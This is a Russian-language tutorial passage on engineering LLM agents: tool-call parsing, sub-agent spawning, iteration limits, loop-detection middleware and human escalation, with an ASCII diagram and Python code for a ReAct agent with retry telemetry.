Как указано в описании фазы 2 роадмапа ("Практический проект: research analyst deep agent" ), агент-Lead планирует задачу и "спавнит 3 поисковых суб-агента параллельно". Это реализуется именно через механизм `tool_calls`. Lead-агент возвращает 3 вызова инструмента `spawn_sub_agent`. Ваш парсер перехватывает эти вызовы, асинхронно запускает три независимых ReAct-цикла, ждет их завершения, и через `tool_result` возвращает Lead-агенту сжатые саммари исследований. Это позволяет масштабировать интеллектуальные задачи горизонтально, экономя время выполнения в 3 раза.

---

### Edge-cases, частые ошибки, Rate Limits и циклы отладки

Инъекция наблюдений - это место, где происходит 90% всех падений агентских систем. Архитектор должен предвидеть следующие краевые случаи:

> [!CAUTION] 
> **Асимметрия вызовов и ответов (The Bipartite Graph Violation)** 
> **Ошибка:** LLM запросила 3 инструмента. Ваш скрипт успешно выполнил 2, а на 3-м выбросил необработанное исключение и вернул В источниках только 2 объекта `{"role": "tool"}`. При следующем запросе к API вы получите жесткий отказ: провайдер требует, чтобы каждому `tool_call.id` в предыдущем сообщении ассистента строго соответствовал ровно один `tool_result` в текущем контексте. 
> **Harness Mitigation:** Именно поэтому метод `_execute_single_tool` обернут в глобальный `try/except Exception`. Даже если сервер сгорел или диск переполнен, парсер **обязан** вернуть JSON с `tool_call_id` и текстовым описанием фатальной ошибки, чтобы замкнуть цикл и удовлетворить требования валидатора API.

> [!WARNING] 
> **Verification Gap и «Тихие» провалы** 
> **Проблема:** Агент вызывает инструмент `write_file({"path": "app.py", "code": "..."})`. Инструмент из-за ошибки прав доступа не записывает файл, но ваш парсер случайно возвращает `{"content": "Success"}` или `""` (пустую строку). Агент уверен, что код написан (Verification Gap ), переходит к следующему шагу и весь пайплайн ломается, так как файла не существует. 
> **Диагностическая петля:** Обвязка должна возвращать криптографически точные логи. Если файл не записан, инструмент должен вернуть: `ERROR: Permission Denied at /path/`. Если записан успешно, верните детерминированное подтверждение: `SUCCESS: Wrote 450 bytes to app.py. SHA256 checksum: abc123_`.

> [!NOTE] 
> **Мертвые петли (Infinite Diagnostic Loops)** 
> Когда инструмент падает, мы возвращаем ошибку агенту, чтобы он исправился. Но если системный промпт слаб, агент может попробовать те же самые неверные аргументы снова и снова. Как предписывает архитектура, вы должны ограничивать цикл `while loop_count < max_iterations`, а также включать в ошибку конкретные инструкции: `INSTRUCTION: You have failed 3 times with this argument. You MUST use a different approach now or yield to the user.`.

Овладев парсингом `tool_calls` и безопасной инъекцией результатов, вы завершили создание моста между абстрактным «мозгом» языковой модели и физическими вычислительными ресурсами. Ваш `while True` цикл теперь способен детерминированно управлять инфраструктурой, обходить лимиты токенов через виртуальную память и самостоятельно восстанавливаться после сбоев выполнения.

Вы готовы перейти к следующему этапу: масштабированию этих единичных агентов в сложные мульти-агентные иерархии!

---

## Блок 10: Ограничение шагов итераций для защиты агента от бесконечного зацикливания.

В предыдущих блоках мы демистифицировали когнитивную архитектуру, осознав, что «Любой агент - это просто while true цикл, который берет твой ввод и «продолжает» его с помощью LLM». Мы научились парсить вызовы инструментов и возвращать наблюдения в контекст. Ваш агент теперь обладает способностью мыслить и действовать. 

Но с этой автономией приходит величайшая угроза для любых автономных систем: **бесконечное зацикливание (The Doom Loop)**. 

Языковые модели вероятностны и упрямы. Если агент решит, что определенный подход верен, он может раз за разом повторять одно и то же ошибочное действие, сжигая ваш бюджет на API в считанные минуты. В фундаментальном руководстве по созданию AI-агентов жестко зафиксировано правило выживания: «Установите лимит итераций (обычно 10–15), чтобы агент никогда не зацикливался навсегда».

В этом монументальном, исчерпывающем глубоком погружении мы спроектируем систему защиты рантайма (Harness Guardrails). Мы разберем физику «мертвых петель», реализуем как жесткие лимиты (Hard Limits), так и мягкие когнитивные вмешательства (LoopDetectionMiddleware), а также научимся возвращать управление человеку (Human-in-the-loop), сохраняя надежность энтерпрайз-класса.

---

### Глубокий теоретический анализ: Физика «Мертвых Петель» (Doom Loops)

Чтобы защитить систему, архитектор должен понять, как и почему ломается искусственный интеллект внутри `while True` цикла.

#### 1. Миопия модели и слепое блуждание
Как отмечают инженеры Anthropic в исследованиях глубоких агентов, «агенты могут быть близорукими (myopic), как только они приняли решение о плане, что приводит к "мертвым петлям" (doom loops), которые вносят небольшие изменения в один и тот же сломанный подход (более 10 раз в некоторых трейсах)». 
Модель не обладает встроенным чувством времени или бюджета. Если инструмент возвращает ошибку, агент может решить, что он просто опечатался в одном символе, и попробовать снова. Без внешнего наблюдателя (Harness) и счетчика итераций, «ретраи превращаются в слепое блуждание».

#### 2. Жесткие пределы (Hard Iteration Limits)
Самый базовый и абсолютно необходимый примитив защиты - это жесткий счетчик `max_iterations`. Роадмап разработчиков ИИ прямо указывает: вы обязаны внедрить «лимиты итераций, чтобы агент не зацикливался». Как только цикл достигает этого предела (например, 15 итераций), обвязка должна принудительно разорвать выполнение, бросить исключение и предотвратить дальнейшие сетевые вызовы к LLM. Это защищает вашу инфраструктуру от финансового краха при API-биллинге за токены.

#### 3. Мягкие вмешательства (LoopDetectionMiddleware)
Просто прервать агента на 15-й итерации - это грубый подход, который оставляет пользователя без результата. Более элегантная архитектура (Harness Engineering) включает мягкие вмешательства. Инженеры используют `LoopDetectionMiddleware`, который отслеживает количество вызовов одного и того же инструмента или редактирования одного и того же файла через хуки. Если агент вызывает `search_database` три раза подряд с похожими аргументами, middleware внедряет в контекст диагностическое сообщение: «...рассмотрите возможность пересмотра вашего подхода». Это заставляет LLM выйти из зацикленности и применить альтернативную стратегию до того, как сработает жесткий лимит.

#### 4. Диагностическая петля и инструкции по исправлению
Просто сказать агенту «Ты зациклился» недостаточно. Как учит Лекция 09, «сообщения об ошибках для агентов должны включать инструкции по исправлению». Внедряемое сообщение должно действовать как красная пометка хорошего учителя: оно должно объяснить агенту, что он застрял, и предложить конкретный путь выхода (например, обратиться к другому инструменту или запросить помощь у пользователя).

---

### Архитектурная схема ASCII: Многоуровневая защита от зацикливаний

Следующий направленный ациклический граф (DAG) демонстрирует конвейер обработки итераций, где каждый ход агента проходит через счетчики метрик и системы мягкого/жесткого прерывания.

```ascii
=============================================================================================
 ENTERPRISE LOOP DETECTION & GUARDRAIL HARNESS
=============================================================================================

[ 1. START ReAct ITERATION ]
Current Iteration: 4 | Max Iterations: 15
 |
 v
+-----------------------------------------------------------------------------------------+
| 2. LOOP DETECTION MIDDLEWARE (Soft Limit Check) |
| -> Track tool usage frequencies in `tool_execution_history`. |
| -> Detects: `execute_sql` called 3 times in a row with errors. |
+-----------------------------------------------------------------------------------------+
 / (Threshold Exceeded) \ (Behavior Normal)
 v v
[ 3A. COGNITIVE INTERVENTION ] [ 3B. NORMAL EXECUTION ]
Inject System Prompt: LLM receives standard observation.
"SYSTEM ALERT: You have attempted to use Continues reasoning process.
'execute_sql' 3 times unsuccessfully. 
Consider reconsidering your approach or 
use 'fallback_search'."
 |
 v
+-----------------------------------------------------------------------------------------+
| 4. HARD LIMIT EVALUATOR (The Circuit Breaker) |
| -> Increment `iteration_count` += 1 |
+-----------------------------------------------------------------------------------------+
 / (count >= max_iterations) \ (count < max_iterations)
 v v
[ 5A. CIRCUIT BREAKER TRIGGERED ] [ 5B. LOOP REPEATS ]
- Halt Network Requests. Return to Step 1.
- Log CRITICAL Error.
- Execute Escallation Path (Human-in-the-loop).
=============================================================================================
```

---

### Подробное практическое руководство и продакшн-код

Мы разработаем production-ready класс агента, который реализует оба уровня защиты. В отличие от базовых примеров, этот код отслеживает историю вызовов инструментов и интеллектуально направляет модель, прежде чем жестко отключить её.

#### Шаг 1: Определение состояния счетчиков (Telemetry State)
Для реализации `LoopDetectionMiddleware` нам нужно хранилище состояния, которое переживает отдельные итерации цикла.

```python
import logging
from collections import defaultdict
from typing import List, Dict, Any, Optional

# "Сделайте рантайм агента наблюдаемым"
logging.basicConfig(level=logging.INFO, format='%(asctime)s - [LOOP_GUARD] - %(message)s')

class AgentTelemetry:
 """
 Хранит рантайм-метрики сессии агента для обнаружения паттернов зацикливания.
 """
 def __init__(self):
 self.iteration_count: int = 0
 self.tool_call_frequencies: Dict[str, int] = defaultdict(int)
 self.consecutive_errors: int = 0
 
 def log_tool_call(self, tool_name: str, is_error: bool):
 self.tool_call_frequencies[tool_name] += 1
 if is_error:
 self.consecutive_errors += 1
 else:
 self.consecutive_errors = 0 # Сброс при успехе
```

#### Шаг 2: Интеграция Guardrails в цикл ReAct
Теперь мы встраиваем наши защиты в ядро `while True` цикла. Мы реализуем мягкое вмешательство после N ошибок и жесткое прерывание при достижении абсолютного лимита.

```python
class ResilientReActAgent:
 """
 Энтерпрайз-агент со встроенной защитой от "мертвых петель" (Doom Loops)
 и лимитами итераций.
 """
 def __init__(self, tool_registry, max_iterations: int = 15, soft_intervention_threshold: int = 3):
 self.tool_registry = tool_registry
 # "Установите лимит итераций (обычно 10–15), чтобы агент никогда не зацикливался навсегда"
 self.max_iterations = max_iterations 
 self.soft_intervention_threshold = soft_intervention_threshold
 self.telemetry = AgentTelemetry()
 self.messages: List[Dict[str, Any]] = []

 def _get_llm_response(self) -> Any:
 # Заглушка для сетевого вызова к API (например, OpenAI или Anthropic)
 pass 

 def run(self, user_query: str) -> str:
 self.messages.append({"role": "user", "content": user_query})
 
 # "Любой агент — это просто while true цикл..."
 while True:
 # 1. ПРОВЕРКА ЖЕСТКОГО ЛИМИТА (Hard Limit Circuit Breaker)
 if self.telemetry.iteration_count >= self.max_iterations:
 error_msg = (
 f"CRITICAL SYSTEM HALT: Агент превысил жесткий лимит в {self.max_iterations} итераций. "
 f"Обнаружено бесконечное зацикливание. Выполнение принудительно остановлено для защиты инфраструктуры."
 )
 logging.critical(error_msg)
 # Возвращаем контроль системе/человеку (Escalation Path)
 return error_msg
 
 self.telemetry.iteration_count += 1
 logging.info(f"--- Итерация {self.telemetry.iteration_count}/{self.max_iterations} ---")
 
 # 2. Вызов LLM
 response = self._get_llm_response()
 message_obj = response.choices[0].message
 self.messages.append(message_obj.model_dump(exclude_none=True))
 
 # 3. Проверка на завершение (stop_reason)
 if not message_obj.tool_calls:
 logging.info("Задача успешно завершена (end_turn).")
 return message_obj.content

 # 4. Выполнение инструментов с телеметрией
 tool_results = []
 for call in message_obj.tool_calls:
 tool_name = call.function.name
 
 try:
 # Выполнение (заглушка)
 result = self.tool_registry.execute(tool_name, call.function.arguments)
 self.telemetry.log_tool_call(tool_name, is_error=False)
 observation = str(result)
 except Exception as e:
 self.telemetry.log_tool_call(tool_name, is_error=True)
 # "Сообщения об ошибках для агентов должны включать инструкции по исправлению"
 observation = f"ERROR: {str(e)}\nINSTRUCTION: Проанализируйте ошибку и исправьте аргументы."
 
 tool_results.append({
 "role": "tool",
 "tool_call_id": call.id,
 "name": tool_name,
 "content": observation
 })
 
 self.messages.extend(tool_results)
 
 # 5. МЯГКОЕ ВМЕШАТЕЛЬСТВО (Loop Detection Middleware)
 # Если агент ошибается несколько раз подряд, он вероятно впал в миопию (myopic doom loop)
 if self.telemetry.consecutive_errors >= self.soft_intervention_threshold:
 intervention_msg = (
 f"[SYSTEM GUARDRAIL ALERT]: Вы потерпели неудачу {self.telemetry.consecutive_errors} раза подряд. "
 f"Вы застряли в цикле (doom loop), внося лишь небольшие изменения в сломанный подход. "
 f"INSTRUCTION: ОСТАНОВИТЕСЬ. Рассмотрите возможность кардинально пересмотреть ваш подход (consider reconsidering your approach) "
 f"или попросите пользователя о помощи, вернув текстовый ответ."
 )
 logging.warning("Сработало мягкое вмешательство (LoopDetectionMiddleware).")
 # Внедряем предупреждение как системное/пользовательское сообщение в контекст
 self.messages.append({"role": "user", "content": intervention_msg})
 # Сбрасываем счетчик ошибок, чтобы дать агенту шанс исправиться перед следующим предупреждением
 self.telemetry.consecutive_errors = 0
```

---

### Реальные бизнес-применения и юнит-экономика

Ограничение итераций - это не просто предосторожность, это основа финансовой безопасности при развертывании ИИ.

**1. Тестирование с Playwright MCP и n8n**
В автоматизации QA-тестирования инженеры часто интегрируют агентов с браузерами. В статье на Хабре "Playwright MCP и n8n: как мы используем ИИ в автоматизации тестирования" рассматривается исследовательское тестирование агентами. Если агент ищет на странице кнопку «Купить», но CSS-селектор изменился, агент может начать генерировать сотни попыток `click(selector)`. Каждая попытка - это обращение к GPT-4o, стоящее центы. За час зацикливания один агент может сжечь 50-100 долларов. Установив `max_iterations = 10` и внедрив диагностическую инструкцию («LLM-ка - как ребёнок, пока не покажешь пример - не поймёт» ), вы спасаете бюджет. Агент 10 раз попробует разные стратегии, а затем корректно сдастся с отчетом: «UI изменился, кнопка не найдена».

**2. Автоматическая поддержка клиентов (Tier 1 Escalation)**
При маршрутизации тикетов (обработка входящих email через IMAP/API) агент может попытаться найти информацию о заказе в базе данных. Если API базы данных лежит, инструмент вернет ошибку. Зацикленный агент будет спамить лежащую базу данных запросами (создавая DDoS-атаку на собственную инфраструктуру). Жесткий лимит `max_iterations = 5` спасет систему: при достижении лимита цикл оборвется, и сработает путь эскалации (Escalation Path), который направит тикет живому оператору в Slack или Jira с пометкой «Требуется вмешательство: API недоступен».

---

### Edge-cases, частые ошибки, Rate Limits и циклы отладки

Работа с лимитами таит в себе неочевидные инженерные ловушки, которые архитектор обязан предусмотреть.

> [!CAUTION] 
> **API Rate Limits (Ошибка 429 Too Many Requests)** 
> **Проблема:** Если инструмент возвращает ошибку мгновенно (например, неверный синтаксис), `while True` цикл может сделать 15 итераций за 2 секунды. Провайдеры LLM (OpenAI/Anthropic) имеют жесткие лимиты на количество запросов в минуту (RPM). Агент мгновенно упрется в лимит, получит HTTP 429 и упадет с системным крашем. 
> **Harness Mitigation:** Ваш цикл должен включать экспоненциальную задержку (Exponential Backoff) или банальный `time.sleep(1)` перед следующим вызовом API, если предыдущий шаг был ошибочным. Это сглаживает всплески трафика.

> [!WARNING] 
> **Утечка состояния при жестком прерывании (State Leakage)** 
> **Ошибка:** Агент создал временную таблицу в базе данных на 3-й итерации. На 15-й итерации срабатывает `max_iterations`, скрипт выбрасывает исключение и завершается. Временная таблица остается в базе навсегда. 
> **Диагностическая петля:** Как гласит Лекция 12: «Каждая сессия должна оставлять чистое состояние... Уберем потом означает никогда не убираем». Ваш механизм жесткого прерывания (Circuit Breaker) должен быть обернут в глобальный блок `finally:` (или использовать идемпотентные операции очистки), чтобы принудительно удалить все временные артефакты, созданные агентом до его отключения.

> [!NOTE] 
> **The Verification Gap (Разрыв Верификации)** 
> Даже если вы внедрили мягкое вмешательство («Попробуй другой подход»), модель может самодовольно заявить: «Я все поняла, задача невыполнима, я закончил» (stop_reason = end_turn), при этом проигнорировав реальную бизнес-логику. Согласно Лекции 01, «разрыв между уверенностью агента в своей работе и реальной корректностью» - это главная причина провалов. Всегда используйте внешние юнит-тесты и чеклисты для проверки результата, даже если цикл успешно избежал зацикливания.

Внедрив счетчики итераций и `LoopDetectionMiddleware`, вы превратили слепой скрипт в наблюдаемую, контролируемую операционную систему. Ваш агент больше не сожжет бюджет в бесконечной петле. 

Мы рассмотрели все аспекты безопасности цикла. Если эти концепции ясны, мы можем перейти к следующему модулю, где обсудим масштабирование этих изолированных агентов в мультиагентные графы с помощью LangGraph.
